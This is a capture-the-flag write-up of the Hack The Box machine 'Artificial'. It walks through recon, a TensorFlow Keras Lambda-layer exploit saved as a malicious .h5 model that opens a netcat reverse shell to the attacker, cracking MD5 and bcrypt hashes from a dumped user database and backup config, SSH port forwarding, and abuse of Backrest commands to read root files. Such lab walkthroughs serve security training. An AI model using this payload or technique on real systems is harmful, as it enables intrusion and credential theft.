---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - Tensorflow
  - Backrest
---
# Overview

| Name        | Artificial |
| ----------- | ---------- |
| OS          | Linux      |
| Status      | Done       |

---
# Recon

## Nmap

```bash
❯  sudo nmap -sC -sV 10.10.11.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:59 +0545
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 10:59 (0:00:06 remaining)
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.29 seconds
```

Upon Registering and Logging on port `80` it leads to normal website to upload, manage and run AI model of  `.h5` (or `.hdf5`) file extension stands for **Hierarchical Data Format version 5**.

![[art.png]]
# Enumeration
## DockerFile

Downloading the DockerFile and seeing its content:

```dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

Lets build the Dockerfile. Go in Folder where you have downloaded Dockerfile.

```bash
❯ docker build -t artificial-htb .
<SNIP>

❯ docker run -it artificial-htb

root@f7100fcf2bc2:/code# 
```
# Exploitation
## Tensorflow RCE

Read more about this exploitation [here](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#getting-the-rce)

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.57 6666 > /tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Save this locally as `exploit.py` and start a python server using `python -m http.server 8888` and then in docker `curl http://<IP>:8888/setup.py > exploit.py` receive it.

```bash
root@eb69e51b2071:/code# ls
exploit.py
tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
```

Now run it using `python exploit.py` and you should get `exploit.h5` file. Now we need to copy it to our local machine for that first find docker ID.

```bash
❯ docker ps              
CONTAINER ID   IMAGE      COMMAND       CREATED         STATUS         PORTS     NAMES
eb69e51b2071   my-image   "/bin/bash"   6 minutes ago   Up 6 minutes             quirky_antonelli
```

Copy `exploit.h5` over your local machine.

```bash
docker cp <container_id>:<path_in_container> <path_on_host>
```

```bash
docker cp eb69e51b2071:/code/exploit.h5 /home/at0m
```

Now start a netcat listener.

```bash
❯ nc -lvnp 6666 
Listening on 0.0.0.0 6666
```

And upload `exploit.h5` in the site and click in `View Prediction` for it to run.

![[artificial.png]]

```bash
❯ nc -lvnp 6666 
Listening on 0.0.0.0 6666
connect to [10.10.14.57] from artificial.htb
/bin/sh: 0: cant access tty; job control turned off
$ whoami
app
```

Currently we are low privileged.
## Sqlite3

We get `users.db` in `/app/instance` directory. Viewing in `sqlite3`.

```bash
app@artificial:~/app/instance ❯ sqlite3 users.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
model  user
sqlite>
sqlite> SELECT * FROM user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|admin|admin@admin|21232f297a57a5a743894a0e4a801fc3
7|r1vs3c|r1vs3c@htb.com|5f4dcc3b5aa765d61d8327deb882cf99
8|5yn7hw4v3|5yn7hw4v3@htb.com|5f4dcc3b5aa765d61d8327deb882cf99
9|23234234|3423432@gmail.com|b815a6766e3b6635c6e956df317b509d
10|OR 1=1|DASDAS@GMAIL.COM|7e58d63b60197ceb55a1c487989a3720
11|dante|dante@hotmail.com|07f574723750e8fb7bb7a6a0902c5725
12|UMDn|qioj|5acdd55f802560a9557b8bc56e2c4731
13|bhiu|zkwV|44ed4678d4ac26496c4120b57198e31f
14|soft|soft@kali.org|c2a2041fe3c4ff7776a7a1c7c134e5e0
15|asdf|asdf@gmail.com|912ec803b2ce49e4a541068d495ab570
16|john|john@htb.com|5f4dcc3b5aa765d61d8327deb882cf99
17|a|b@b.com|92eb5ffee6ae2fec3ad71c777531578f
18|test@test.com|test@test.com|5f4dcc3b5aa765d61d8327deb882cf99
19|aland|alanduni2025@gmail.com|2601c06db223ef29c6e5e7894154b78f
20|test|test@gm.com|098f6bcd4621d373cade4e832627b4f6
21|tester006|tester006@mail.com|dfc9339ee87bb806dd526fff011e16d7
22|user|temp@email.com|5f4dcc3b5aa765d61d8327deb882cf99
23|Atomxploit|fatexashura@gmail.com|a06f8f83d3992ac5a580429c9136fa70
sqlite> SELECT * FROM model;
f28ecef8-5716-4d2d-88c6-444278165e7e|f28ecef8-5716-4d2d-88c6-444278165e7e.h5|7
2258bc17-d790-4706-866e-5933b3b2a01d|2258bc17-d790-4706-866e-5933b3b2a01d.h5|8
077f1323-2d6d-4feb-8d90-40155af6cf59|077f1323-2d6d-4feb-8d90-40155af6cf59.h5|11
a1e3ae97-f796-459a-87da-26e7e7543204|a1e3ae97-f796-459a-87da-26e7e7543204.h5|20
e5f828db-9a74-413a-8b45-212f7364c994|e5f828db-9a74-413a-8b45-212f7364c994.h5|22
5a6f6902-5b6e-460a-b6ca-7dbb35781b2c|5a6f6902-5b6e-460a-b6ca-7dbb35781b2c.h5|21
sqlite>
```

We see bunch of data including of `admin` with their **email** and **hashes** in MD5 format.
## Admin Hashes

Upon putting the hashes of `admin` in [crackstation](https://crackstation.net/) we see that it's password is also `admin`. But we dont seem to be able to log in so i tried with `gael@artificial.htb` which password also could be cracked `mattp005numbertwo` from crackstation and we could login but there doesn't seem to be much really like it's same as ours.
## SSH 

Authenticate to SSH with `gael:mattp005numbertwo`

```bash
❯ ssh gael@artificial.htb
gael@artificial.htb password: mattp005numbertwo

Last login: Sun Jun 22 05:30:41 2025 from 10.10.14.42
gael@artificial:~$ ls
user.txt
gael@artificial:~$ cat user.txt
457342bed98e2b8f580e44fff9eb4318
```
# Privilege Escalation

```bash
gael@artificial:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
udp        0      0 127.0.0.53:53           0.0.0.0:*
```

 We see many ports listening, I tried other but only port `9898` stands out to us.
## Port Forwarding

```bash
❯  ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

Checking on our Attack machine on `localhost:9898` it shows using [Backrest](https://github.com/garethgeorge/backrest) version `1.7.2` and credentials of `gael` or other users also doesn't seem to work.

![[nbackrest.png]]
## LinPeas

Couldn't get credentials so ran Linpeas it gave one at `/var/backups`.

```bash
gael@artificial:~$ cd /var/backups
gael@artificial:/var/backups$ ls
apt.extended_states.0     apt.extended_states.4.gz
apt.extended_states.1.gz  apt.extended_states.5.gz
apt.extended_states.2.gz  apt.extended_states.6.gz
apt.extended_states.3.gz  backrest_backup.tar.gz
gael@artificial:/var/backups$ ls -la
total 51228
drwxr-xr-x  2 root root       4096 Jun 23 10:36 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
```

We see `backrest_backup.tar.gz` but can't `tar -xzvf` it because it has root permission but we can transfer it to our Attack Machine using `SCP`.
## Transferring Backup

```bash
❯ scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz .

gael@artificial.htb's password:
backrest_backup.tar.gz                   100%   50MB 700.3KB/s   01:13
```

```bash
❯ tar -xvf backrest_backup.tar.gz
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh

❯ cd backrest

❯ cat .config/backrest/config.json        

{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

We can see format is `Bcrypt` but it currently looks like `base64` encoded to get original hash.
## Getting Original Hash

```bash
❯ echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

We get original hash `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO`
## John The Ripper

Save above hash in `hash.txt`

```bash
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt  

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:22 0.02% (ETA: 2025-06-24 09:31) 0g/s 185.3p/s 185.3c/s 185.3C/s bellota..kittys
0g 0:00:00:25 0.03% (ETA: 2025-06-24 09:35) 0g/s 185.5p/s 185.5c/s 185.5C/s abigail1..micah
0g 0:00:00:27 0.03% (ETA: 2025-06-24 09:24) 0g/s 185.7p/s 185.7c/s 185.7C/s salman..zanessa
!@#$%^           (?)     
1g 0:00:00:29 DONE (2025-06-23 07:22) 0.03442g/s 185.8p/s 185.8c/s 185.8C/s baby16..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got the very weird password `!@#$%^`  . 
## Abusing Backrest

 Remember our port forwarded site we can now authenticate with creds `backrest_root:!@#$%^` in `localhost:9898`.

 First Create a Repository and fill it with any value you want but make sure to atleast fill these 3 inputs.
 
![[backrest.png]]

Now go at Repo and go on `Run Command` Section.

![[backrest2.png]]

We can run some useful commands here, you can run `help` to see list of commands that will be useful to us.

![[backrest3.png]]

We can use command `backup /root` to create a new backup of it.

![[backrest4.png]]

After running it we can see that it gives us our snapshot ID which in our case is `99740995`.

![[backrest5.png]]

We can use `ls <snapshot-id>` to list content of `/root` directory. As we can see we got contents of `/root` directory.

![[backrest6.png]]

Now just simply dump the `root.txt` from `/root` using command `dump <snapshot-id> /root/root.txt`.

![[backrest7.png]]
# Pwn3d!

---

